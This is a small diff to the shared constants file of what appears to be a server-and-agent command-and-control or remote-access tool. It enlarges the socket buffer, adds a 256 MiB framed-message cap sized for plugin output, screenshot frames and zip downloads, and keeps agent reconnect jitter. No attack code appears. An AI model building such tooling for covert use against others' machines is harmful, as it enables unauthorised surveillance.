@@ -5,11 +5,23 @@ Shared constants used by both the server and agent.
 """
 
 # TCP transport
-BUFFER_SIZE: int   = 4096
+BUFFER_SIZE: int   = 65536  # general socket read buffer — 64 KiB covers the largest
+                             # post-handshake C2 frame comfortably and keeps recv()
+                             # calls coarse enough not to thrash the kernel
 AUTH_TIMEOUT: int  = 10    # seconds — tight window prevents connection-holding attacks
 RECONNECT_DELAY: int = 10  # seconds — base delay before agent retries
 RECONNECT_JITTER: int = 5  # seconds — random 0..JITTER added so multiple agents don't
                             #           reconnect in sync after a server restart
+
+# Frame / message size limits
+# MAX_PLUGIN_MSG_SIZE is enforced by _recv_framed in protocol.py as a safety cap
+# against memory exhaustion from a rogue or malformed peer.  It must be large
+# enough for:
+#   - large plugin output blobs (stdout of compiled C/C++ plugins)
+#   - screenshot JPEG frames   (~200–400 KB per frame at quality 85)
+#   - zip downloads / timelapse zips
+# 256 MiB is generous for all of the above while still catching runaway allocations.
+MAX_PLUGIN_MSG_SIZE: int = 256 * 1024 * 1024   # 256 MiB hard cap per framed message
 
 # Listener hardening
 MAX_AUTH_ATTEMPTS_PER_MIN: int = 5   # per source IP; excess connections are dropped
